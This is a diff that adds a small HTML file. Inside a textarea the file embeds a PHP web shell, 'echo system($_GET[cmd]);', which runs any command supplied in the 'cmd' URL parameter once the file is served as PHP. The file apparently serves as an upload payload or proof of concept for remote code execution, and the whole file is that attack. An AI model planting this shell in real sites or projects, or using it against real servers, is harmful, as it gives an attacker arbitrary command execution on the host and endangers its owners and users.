@@ -1,0 +1,10 @@
+<html>
+<head></head>
+<body>
+<textarea name="CONTENT" style="width:100%; height:80%">
+<?php
+	echo system($_GET[cmd]);
+?>
+</textarea>
+</body>
+</html>
